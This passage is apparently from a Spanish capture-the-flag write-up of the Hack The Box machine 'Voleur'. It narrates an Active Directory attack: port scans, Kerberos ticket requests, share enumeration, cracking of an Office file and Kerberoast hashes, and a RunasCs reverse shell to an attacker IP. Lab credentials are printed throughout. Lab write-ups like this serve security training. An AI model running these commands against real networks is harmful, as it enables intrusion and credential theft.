</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 56867/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 56866/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 49667/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 49664/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 2222/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 59455/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 56869/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 56892/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 22:41, 26.40s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.76
</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2025-07-05 22:41:11 CEST <span style="color:#66d9ef">for</span> 26s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc            syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>2222/tcp  open  EtherNetIP-1     syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49664/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49667/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>56866/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>56867/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>56869/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>56892/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>59455/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.45 seconds
</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131061</span> <span style="color:#f92672">(</span>5.767MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">33</span> <span style="color:#f92672">(</span>1.452KB<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ports.py ports
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>üîç Puertos encontrados:
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">53</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">88</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">135</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">139</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">389</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">445</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">464</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">593</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">636</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">2222</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">3268</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">3269</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">5985</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">9389</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">49664</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">49667</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">56866</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">56867</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">56869</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">56892</span>
</span></span><span style="display:flex;"><span>  ‚ûú  <span style="color:#ae81ff">59455</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>¬°Puertos copiados en el portapapeles!
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49667,56866,56867,56869,56892,59455 10.10.11.76 -oN targeted
</span></span><span style="display:flex;"><span>Starting Nmap 7.97 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-07-05 22:45 +0200
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.76
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.067s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-07-06 04:45:31Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
</span></span><span style="display:flex;"><span>2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>56866/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>56867/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>56869/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>56892/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>59455/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   3.1.1:
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2025-07-06T04:46:21
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: 7h59m49s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 100.99 seconds
</span></span></code></pre></div><h1 id="autenticacion-ntlm-deshabilitada">Autenticacion NTLM deshabilitada<a hidden class="anchor" aria-hidden="true" href="#autenticacion-ntlm-deshabilitada">#</a></h1>
<p>Al intentar comprobar las credenciales recibidas para iniciar la m√°quina, vemos que nos da como resultado <code>STATUS_NOT_SUPPORTED</code> adem√°s de que nos devuelve que <code>NTLM:False</code>.</p>
<p>Esto quiere decir que o que el usuario tiene la autenticaci√≥n NTLM deshabilitada o que directamente no se permite la autenticaci√≥n NTLM en el dominio.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ nxc smb 10.10.11.76 -u <span style="color:#e6db74">&#39;ryan.naylor&#39;</span> -p <span style="color:#e6db74">&#39;HollowOct31Nyt&#39;</span> --shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.76     <span style="color:#ae81ff">445</span>    10.10.11.76      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>  x64 <span style="color:#f92672">(</span>name:10.10.11.76<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:10.10.11.76<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>NTLM:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.76     <span style="color:#ae81ff">445</span>    10.10.11.76      <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.11.76<span style="color:#ae81ff">\r</span>yan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
</span></span></code></pre></div><p>Entonces sincronizamos nuestra m√°quina con <code>ntpdate</code> al dominio y luego probamos a autenticarnos mediante kerberos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ntpdate -u 10.10.11.76
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nxc ldap 10.10.11.76 -k -u <span style="color:#e6db74">&#39;ryan.naylor&#39;</span> -p <span style="color:#e6db74">&#39;HollowOct31Nyt&#39;</span>
</span></span></code></pre></div><p><img alt="Voleur Machine 1" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_1.png"></p>
<h2 id="configuraci√≥n-krb5conf">Configuraci√≥n krb5.conf<a hidden class="anchor" aria-hidden="true" href="#configuraci√≥n-krb5conf">#</a></h2>
<p>Parece que vamos a tener que autenticarnos a trav√©s de <code>Tickets Garanting Tickets (TGT)</code> , con lo cual vamos a realizar la configuraci√≥n del archivo <code>krb5.conf</code> para que cuando intentemos auntenticarnos mediante kerberos encuentre el <code>Key Distribution Center (KDC)</code>.</p>
<pre tabindex="0"><code>sudo nano /etc/krb5.con

[libdefaults]
    default_realm = VOLEUR.HTB
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
</code></pre><p>Una vez configurado el archivo krb5, con la herramienta <code>getTGT.py</code> voy a solicitar el Ticket Garanting Ticket (TGT) para el usuario ryan.naylor, que nos devolver√° un ticket en formato .ccache para luego nosotros exportarlo a la variable <code>KRB5CCNAME</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getTGT.py voleur.htb/ryan.naylor:<span style="color:#e6db74">&#39;HollowOct31Nyt&#39;</span> -dc-ip 10.10.11.76
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>/home/borhub/Workspace/HTB/Voleur/CONTENT/ryan.naylor.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>klist
</span></span></code></pre></div><p><img alt="Voleur Machine 2" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_2.png"></p>
<h2 id="enumeraci√≥n-smb--modulo-spider_plus---nxc">Enumeraci√≥n SMB + modulo spider_plus - nxc<a hidden class="anchor" aria-hidden="true" href="#enumeraci√≥n-smb--modulo-spider_plus---nxc">#</a></h2>
<p>Ahora, vamos a ponerle a la variable <code>FQDN</code> el valor DC.voleur.htb, y luego realizaremos un escaneo a las carpetas comparitdas haciendo uso de nxc y la opci√≥n <code>--use-kcache</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export FQDN<span style="color:#f92672">=</span>DC.voleur.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nxc smb <span style="color:#e6db74">&#34;</span>$FQDN<span style="color:#e6db74">&#34;</span> --use-kcache --shares
</span></span></code></pre></div><p><img alt="Voleur Machine 3" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_3.png"></p>
<p>Vemos que tenemos varias carpetas no comunes como Finance, HR y IT, pero solo tenemos permiso de lectura con la carpeta IT, con lo cual vamos a enumerarla con el modulo <code>spider_plus</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb <span style="color:#e6db74">&#34;</span>$FQDN<span style="color:#e6db74">&#34;</span> --use-kcache --shares -M spider_plus
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat /home/borhub/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json | jq
</span></span></code></pre></div><p><img alt="Voleur Machine 4" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_4.png"></p>
<p>Vemos que dentro de la carpeta tenemos un archivo de excel llamado <code>Acces_Review</code>. Con lo cual nos lo descargamos con nxc usando <code>--get-file</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb <span style="color:#e6db74">&#34;</span>$FQDN<span style="color:#e6db74">&#34;</span> --use-kcache --share <span style="color:#e6db74">&#39;IT&#39;</span> --get-file <span style="color:#e6db74">&#39;First-Line Support/Access_Review.xlsx&#39;</span> Access_Review.xlsx
</span></span></code></pre></div><p><img alt="Voleur Machine 5" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_5.png"></p>
<p>Una vez tenemos el archivo nos lo abrimos, pero vemos que el archivo esta encriptado y necesitamos una contrase√±a para desbloaquearlo.</p>
<p><img alt="Voleur Machine 6" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_6.png"></p>
<h3 id="extrayendo-y-crackeando-hash-de-un-archivo-protegido-xlsx---jhon">Extrayendo y crackeando hash de un archivo protegido xlsx - Jhon<a hidden class="anchor" aria-hidden="true" href="#extrayendo-y-crackeando-hash-de-un-archivo-protegido-xlsx---jhon">#</a></h3>
<p>Primero haciendo uso del script Office2Jhon extraemos el hash del archivo protegido.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/Herramientas/john/run/office2john.py Access_Review.xlsx &gt; hash-excel
</span></span></code></pre></div><p>Ahora, vamos a craquear el hash obtenido usando el formato <code>office</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>office hash-excel /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
</span></span></code></pre></div><p><img alt="Voleur Machine 7" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_7.png"></p>
<p>Una vez con la contrase√±a crackeada, desbloqueamos el archivo xlsx y vemos una tabla sobre los usuarios, permisos, estado de los usuarios y incluso algunas contrase√±as.</p>
<p><img alt="Voleur Machine 8" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_8.png"></p>
<h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
<p>Lanzamos el siguiente script de <code>bloodhound-python</code> para recabar toda la informaci√≥n posible del sistema, que luego usaremos en Bloodhound.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#e6db74">&#39;ryan.naylor&#39;</span> -k -no-pass -d VOLEUR.HTB -ns 10.10.11.76 -dc DC.voleur.htb -c all --zip --auth-method kerberos
</span></span></code></pre></div><p><img alt="Voleur Machine 9" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_9.png"></p>
<p>Una vez metido los datos en Bloodhound, y habiendo revisado los usuarios visto en el excel. Vemos que el siguiente paso a dar ser√° con <code>svc_ldap</code> del cual ademas tenemos una credencial en el apartado notas.</p>
<p><img alt="Voleur Machine 10" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_10.png"></p>
<p>Comprobamos que las credenciales de svc_ldap sean validas. Y le sacamos un Ticket Garanting Ticket (TGT).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.10.11.76 -k -u <span style="color:#e6db74">&#39;svc_ldap&#39;</span> -p <span style="color:#e6db74">&#39;M1XyC9pW7qT5Vn&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getTGT.py voleur.htb/svc_ldap:<span style="color:#e6db74">&#39;M1XyC9pW7qT5Vn&#39;</span> -dc-ip 10.10.11.76
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>/home/borhub/Workspace/HTB/Voleur/CONTENT/svc_ldap.ccache
</span></span></code></pre></div><p><img alt="Voleur Machine 11" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_11.png"></p>
<p><img alt="Voleur Machine 12" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_12.png"></p>
<p>Una vez con el TGT vamos a proceder a abusar de los permisos <code>GenericWrite</code> sobre el usuario lacey.miller y los permisos <code>WriteSPN</code> sobre svc_winrm lanzando un <code>kerberoast attack</code>.</p>
<h2 id="kerberoast-attack---tergetedkerberoastpy">Kerberoast Attack - tergetedKerberoast.py<a hidden class="anchor" aria-hidden="true" href="#kerberoast-attack---tergetedkerberoastpy">#</a></h2>
<p>Lanzamos el comando usando el script <code>targetedKerberoast.py</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.76 --dc-host DC.voleur.htb -d <span style="color:#e6db74">&#39;VOLEUR.HTB&#39;</span> -u <span style="color:#e6db74">&#39;svc_ldap&#39;</span> --no-pass -k
</span></span></code></pre></div><p><img alt="Voleur Machine 13" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_13.png"></p>
<p>Y vemos que tenemos los hashes <code>Ticket Garanting Service (TGS)</code> de los usuarios lacey.miller y de svc_winrm. Ahora, usando hashcat vamos a tratar de crackearlos para obtener ambas contrase√±as.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat hash_tgs /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
</span></span></code></pre></div><p><img alt="Voleur Machine 14" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_14.png"></p>
<p>Vemos que la contrase√±a crackeada es <code>AFireInsidedeOzarctica980219afi</code>. Y iniciamos sesi√≥n a trav√©s de winrm. Con lo cual generamos el Ticket Garanting Ticket (TGT) y iniciamos sesi√≥n en la m√°quina.</p>
<p><img alt="Voleur Machine 15" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_15.png"></p>
<p>En un principio intente hacer el ataque <code>ShadowCredentials</code> sobre el usuario lacey.miller, pero no estaba funcionando. Con lo cual seguramente el siguiente paso vaya por conseguir restaurar el usuario eliminado <code>Todd.Wolfie</code> que hab√≠amos visto anteriormente en la nota.</p>
<h2 id="shell-como-svc_ldap---runascsexe">Shell como svc_ldap - Runascs.exe<a hidden class="anchor" aria-hidden="true" href="#shell-como-svc_ldap---runascsexe">#</a></h2>
<p>Nosotros en este caso tenemos una shell como el usuario <code>svc_winrm</code> , pero desde este usuario no tenemos los permisos Restore Objects que si tiene svc_ldap. Con lo cual haciendo uso de <code>runascs.exe</code>, vamos abrirnos una shell con runascs haciendo uso del usuario ldap.</p>
<ul>
<li><code>RunasCS</code> es una herramienta que nos permite ejecutar diferentes procesos con los permisos obtenidos de las credenciales que le indicamos en el la linea de comando.</li>
</ul>
<p>Para empezar, vamos a subir a la m√°quina mediante <code>upload</code> el archivo <code>RunasCs.exe</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_winrm\Documents&gt; upload ./RunasCs/RunasCs.exe
</span></span></code></pre></div><p>Luego ejecutamos el siguiente comando:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r <span style="color:#ae81ff">10.10</span>.15.<span style="color:#ae81ff">254</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p><img alt="Voleur Machine 16" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_16.png"></p>
<h2 id="restaurando-usuario-eliminado-con-restore-adobject">Restaurando usuario eliminado con Restore-ADObject<a hidden class="anchor" aria-hidden="true" href="#restaurando-usuario-eliminado-con-restore-adobject">#</a></h2>
<p>Ahora con la shell recibida como el usuario svc_ldap, vamos a restaurar el usuario Todd.Wolfe. Primero comprobamos los objetos eliminados con <code>Get-ADObject</code>, entre ellos vemos al usuario que tenemos como objetivo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-ADObject -IncludeDeletedObjects -Filter <span style="color:#f92672">{</span>Isdeleted -eq $true<span style="color:#f92672">}</span>
</span></span></code></pre></div><p><img alt="Voleur Machine 17" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_17.png"></p>
<p>Ahora con el usuario identificado vamos a restaurarlo con <code>Restore-ADObject</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Restore-ADObject -Identity <span style="color:#e6db74">&#34;1c6b1deb-c372-4cbb-87b1-15031de169db&#34;</span> -NewName <span style="color:#e6db74">&#34;Todd.Wolfe&#34;</span>
</span></span></code></pre></div><p><img alt="Voleur Machine 18" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_18.png"></p>
<h1 id="movimiento-lateral---dpapi-files">Movimiento Lateral - DPAPI Files<a hidden class="anchor" aria-hidden="true" href="#movimiento-lateral---dpapi-files">#</a></h1>
<p>Luego de estar mirando los permisos de Todd.Wolfe, no encuentro nada interesante es entonces cuando decido lanzar el <code>winPEAS.exe</code>. Luego de estar un rato mir√°ndolo, descubro que existen unas DPAPI Master Key Keys.</p>
<p><img alt="Voleur Machine 19" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine_19.png"></p>
